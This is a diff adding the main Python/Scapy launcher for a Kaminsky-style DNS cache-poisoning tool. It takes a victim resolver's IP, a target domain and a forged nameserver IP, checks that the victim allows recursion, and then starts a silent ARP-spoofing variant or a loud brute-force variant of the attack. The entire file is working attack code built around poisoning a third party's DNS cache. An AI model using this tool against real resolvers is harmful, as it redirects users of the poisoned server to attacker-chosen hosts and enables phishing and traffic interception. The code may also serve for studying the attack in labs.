@@ -1,0 +1,76 @@
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, sr, sendp, send
+import sys
+import datetime
+# input processing
+import argparse
+# colors
+from vars import ccolors
+# custom modules
+from kaminskySilent import silent as silent
+from kaminskyLoud import loud as loud
+from getsoa import getSoaForDomain
+from validinp import validateInput
+import utils
+
+# collect command line input
+parser = argparse.ArgumentParser(description='Kaminsky DNS', prog='kaminsky')
+posArgs = parser.add_argument_group('PositionalArgs', 'Positional Arguments')
+posArgs.add_argument('victim', nargs='?', help='Victim DNS server (provide IP)', metavar='victimIP')
+posArgs.add_argument('targetDomain', nargs='?', help='Target domain that is to be poisoned in the cache (provide URL)', metavar='targetDomain')
+posArgs.add_argument('addressToForge', nargs='?', help='Server to be spoofed as target domain\'s authoritate DNS server (provide IP)', metavar='yourDNSIP')
+parser.add_argument('-t', '--ttl', dest='ttl', type=int, action='store', const=86400, default=86400, nargs='?', help='Time To Live to be injected into the record in victim\'s cache')
+# -s (--silent) and -l (--loud) cannot be put together
+exclGroup = parser.add_mutually_exclusive_group();
+exclGroup.add_argument('-s', '--silent', dest='silent', action='store_true', help='Execute the silent (ARP spoofing) variant of the attack.')
+exclGroup.add_argument('-l', '--loud', dest='loud', action='store_true', help='Execute the loud (brute-force) variant of the attack.')
+parser.add_argument('-d', '--demo', dest='demo', action='store', default=None)
+
+# Set default attack mode
+parser.set_defaults(silent=True, loud=False)
+args = parser.parse_args()
+
+args.startTime = datetime.datetime.now()
+
+# validate input
+if not validateInput(args):
+    sys.exit()
+
+if not args.demo:
+    # get the start of authority (SOA) record for target domain and glue IP
+    if not getSoaForDomain(args):
+        sys.exit()
+else:
+    args.soaDomain = []
+    args.soaDomain.append("ns-auth.example.com")
+    args.soaIP = []
+    args.soaIP.append(args.demo)
+
+if not args.demo:
+    # check whether the supplied DNS server is authoritative and whether it supports reccursion
+    if args.victim in args.soaIP:
+        print(ccolors.WARNING + 'Selected DNS server is authoritative for the supplied domain. You cannot cache poison an authoritative nameserver with this tool!\n' + ccolors.FAIL + 'Terminating...' + ccolors.NC)
+        sys.exit()
+        
+    pkt = IP(dst=args.victim)/UDP(sport=utils.getRandomPort(),dport=53)/DNS(rd=1,qd=DNSQR(qname="www.google.com"))
+    ans = sr1(pkt, verbose=0, timeout=5)
+    
+    if ans is None:
+        print(ccolors.WARNING + 'Supplied victim IP does not answer to DNS queries. Check IP and try again.\n' + ccolors.FAIL + 'Terminating...' + ccolors.NC)
+        sys.exit()
+        
+    if ans[DNS].ra == 0:
+        print(ccolors.WARNING + 'Supplied victim nameserver does not offer recursion, therefore cannot be cache poisoned with this tool.\n' + ccolors.FAIL + 'Terminating...' + ccolors.NC)
+        # Py3: Corrected indentation for sys.exit()
+        sys.exit()
+
+# print the starting message and start
+out = ccolors.OKGREEN + '\nVictim DNS: ' + args.victim + '\nTarget domain: ' + args.targetDomain + '\nSpoofing IP: ' + args.addressToForge + '\nMethod: '
+
+if args.loud:
+    print(out + 'loud' + ccolors.NC)
+    print(ccolors.UNDERLINE + '\nStarting sequence\n' + ccolors.NC)
+    loud(args)
+else: # Default is silent
+    print(out + 'silent' + ccolors.NC)
+    print(ccolors.UNDERLINE + '\nStarting sequence\n' + ccolors.NC)
+    silent(args)
